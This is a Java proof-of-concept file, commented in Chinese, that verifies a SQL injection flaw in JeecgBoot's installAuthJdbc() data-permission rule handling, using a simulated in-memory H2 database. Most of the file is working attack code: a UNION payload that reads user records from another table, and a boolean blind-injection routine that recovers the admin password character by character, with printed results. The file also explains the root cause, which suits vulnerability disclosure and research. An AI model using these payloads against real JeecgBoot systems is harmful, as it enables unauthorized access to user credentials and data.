/**
 * PoC: JeecgBoot QueryGenerator.installAuthJdbc() SQL注入验证
 *
 * 说明:
 *   本 PoC 使用 H2 内存数据库模拟 JeecgBoot 的数据权限规则注入场景。
 *   模拟 installAuthJdbc() 中 getSqlRuleValue() 返回值被直接拼接到
 *   SQL 语句中（对应 JeecgDemoMapper.xml 的 ${permissionSql} 写法），
 *   证明攻击者可通过配置恶意 ruleValue 实现 UNION 注入和布尔盲注。
 *
 * 环境要求:
 *   JDK 8+
 *   H2 数据库 JAR (h2-2.2.224.jar 或任意版本)
 *
 * 编译运行:
 *   javac -cp h2-2.2.224.jar PoC_VerifySQLi.java
 *   java -cp .:h2-2.2.224.jar PoC_VerifySQLi
 *   (Windows 用 ; 替代 :)
 *
 * 漏洞文件:
 *   QueryGenerator.java 第951行
 *   JeecgDemoMapper.xml 第12行
 *
 * 作者: [你的名字]
 * 日期: 2026-05-23
 */

import java.sql.*;

public class PoC_VerifySQLi {

    public static void main(String[] args) throws Exception {

        // ============================================================
        // 1. 初始化 H2 内存数据库，模拟 JeecgBoot 的表结构
        // ============================================================
        Connection conn = DriverManager.getConnection(
            "jdbc:h2:mem:jeecg_poc;DB_CLOSE_DELAY=-1", "sa", "");
        Statement stmt = conn.createStatement();

        // 创建 demo 表（对应 JeecgDemoMapper.xml 查询的目标表）
        stmt.execute("CREATE TABLE demo ("
            + "id VARCHAR(64) PRIMARY KEY, "
            + "name VARCHAR(100), "
            + "age INT)");
        stmt.execute("INSERT INTO demo VALUES ('d1', '正常数据A', 25)");
        stmt.execute("INSERT INTO demo VALUES ('d2', '正常数据B', 30)");

        // 创建 sys_user 表（模拟敏感用户表，攻击目标）
        stmt.execute("CREATE TABLE sys_user ("
            + "id VARCHAR(64) PRIMARY KEY, "
            + "username VARCHAR(100), "
            + "password VARCHAR(100))");
        stmt.execute("INSERT INTO sys_user VALUES ('1', 'admin', 'admin123')");
        stmt.execute("INSERT INTO sys_user VALUES ('2', 'jeecg', 'jeecg@2026')");
        stmt.execute("INSERT INTO sys_user VALUES ('3', 'test_user', 'password456')");

        System.out.println("======================================================================");
        System.out.println("PoC: JeecgBoot QueryGenerator.installAuthJdbc() SQL注入验证");
        System.out.println("======================================================================");
        System.out.println();

        // ============================================================
        // 2. 正常查询（无注入）
        // ============================================================
        System.out.println("[正常场景] 无数据权限规则时的查询:");
        System.out.println("SQL: select * from demo where 1=1");
        System.out.println("---");
        ResultSet rs = stmt.executeQuery("select * from demo where 1=1");
        printDemoResults(rs);
        System.out.println();

        // ============================================================
        // 3. 模拟漏洞: UNION 注入跨表窃取
        // ============================================================
        // 模拟攻击者在 sys_permission_data_rule 表中配置的恶意 ruleValue:
        String maliciousRuleValue_union =
            "1=2 UNION SELECT id, username, id FROM sys_user WHERE 1=1 OR 1=1";

        // 模拟 installAuthJdbc() 的拼接逻辑:
        //   sb.append(sqlAnd + getSqlRuleValue(ruleMap.get(c).getRuleValue()));
        // getSqlRuleValue() 对不含 #{} 变量的输入直接原样返回
        String permissionSql_union = " and " + maliciousRuleValue_union;

        // 模拟 JeecgDemoMapper.xml 的 ${permissionSql} 拼接:
        //   select * from demo where 1=1 ${permissionSql}
        String finalSql_union = "select * from demo where 1=1" + permissionSql_union;

        System.out.println("[攻击场景1] UNION注入 — 跨表窃取 sys_user 数据:");
        System.out.println("恶意 ruleValue: " + maliciousRuleValue_union);
        System.out.println("最终执行SQL: " + finalSql_union);
        System.out.println("---");

        rs = stmt.executeQuery(finalSql_union);
        // demo 表有 id, name, age 三列
        // UNION 出来的是 sys_user 的 id, username, id
        // 映射到 demo 的结果: id=sys_user.id, name=sys_user.username, age=sys_user.id
        System.out.println("结果（注意: name 列现在返回的是 sys_user.username）:");
        printDemoResults(rs);
        System.out.println();

        // ============================================================
        // 4. 模拟漏洞: 布尔盲注猜解密码
        // ============================================================
        System.out.println("[攻击场景2] 布尔盲注 — 逐字符猜解 admin 密码:");
        System.out.println("目标: sys_user 表中 username='admin' 的 password 字段");
        System.out.println("---");

        String targetPassword = blindInject(stmt, "admin");
        System.out.println("猜解结果: " + targetPassword);
        System.out.println();

        // ============================================================
        // 5. 对比: installAuthMplus 加了 filterContent 后的效果
        // ============================================================
        System.out.println("[对比] 如果有 SqlInjectionUtil.filterContent() 过滤:");
        System.out.println("filterContent 会检测 ruleValue 中的 UNION/SELECT 等关键词");
        System.out.println("检测到后抛出异常，阻止 SQL 执行。");
        System.out.println("但 installAuthJdbc() 没有调用 filterContent()，所以注入成功。");
        System.out.println();

        // ============================================================
        // 6. 总结
        // ============================================================
        System.out.println("======================================================================");
        System.out.println("验证结论:");
        System.out.println("  1. UNION注入: 成功跨表读取 sys_user 全部用户名");
        System.out.println("  2. 布尔盲注: 成功猜解 admin 密码为 \"" + targetPassword + "\"");
        System.out.println("  3. 根因: installAuthJdbc() 第951行无 filterContent 过滤");
        System.out.println("  4. 落地: JeecgDemoMapper.xml 使用 ${permissionSql} 字符串替换");
        System.out.println("======================================================================");

        conn.close();
    }

    /**
     * 模拟布尔盲注: 逐字符猜解指定用户的密码
     *
     * 对应攻击者配置的 ruleValue:
     *   1=1 AND SUBSTRING((SELECT password FROM sys_user WHERE username='admin'),{pos},1)='{char}'
     *
     * installAuthJdbc() 将其拼接后:
     *   select * from demo where 1=1 and 1=1 AND SUBSTRING((...),1,1)='a'
     *
     * 如果返回结果行数 > 0，说明该字符猜对了。
     */
    private static String blindInject(Statement stmt, String targetUser) throws SQLException {
        StringBuilder password = new StringBuilder();
        String charset = "abcdefghijklmnopqrstuvwxyz0123456789@#$%_";

        System.out.println("开始猜解 (最多32位)...");
        for (int pos = 1; pos <= 32; pos++) {
            boolean found = false;
            for (char c : charset.toCharArray()) {
                // 构造盲注 ruleValue
                String ruleValue = "1=1 AND SUBSTRING("
                    + "(SELECT password FROM sys_user WHERE username='" + targetUser + "'),"
                    + pos + ",1)='" + c + "'";

                // 模拟 installAuthJdbc() 拼接
                String permissionSql = " and " + ruleValue;
                String sql = "select * from demo where 1=1" + permissionSql;

                ResultSet rs = stmt.executeQuery(sql);
                if (rs.next()) {
                    // 有结果 = 字符猜对
                    password.append(c);
                    System.out.println("  位置 " + pos + ": '" + c + "' (命中)");
                    found = true;
                    rs.close();
                    break;
                }
                rs.close();
            }
            if (!found) {
                // 所有字符都没命中，说明密码已结束
                break;
            }
        }
        return password.toString();
    }

    /**
     * 打印 demo 表格式的查询结果
     */
    private static void printDemoResults(ResultSet rs) throws SQLException {
        ResultSetMetaData meta = rs.getMetaData();
        int colCount = meta.getColumnCount();
        int rowNum = 0;
        while (rs.next()) {
            rowNum++;
            StringBuilder sb = new StringBuilder();
            sb.append("  行").append(rowNum).append(": ");
            for (int i = 1; i <= colCount; i++) {
                if (i > 1) sb.append(" | ");
                sb.append(meta.getColumnName(i)).append("=").append(rs.getString(i));
            }
            System.out.println(sb.toString());
        }
        if (rowNum == 0) {
            System.out.println("  (无结果)");
        }
        System.out.println("  共 " + rowNum + " 行");
    }
}
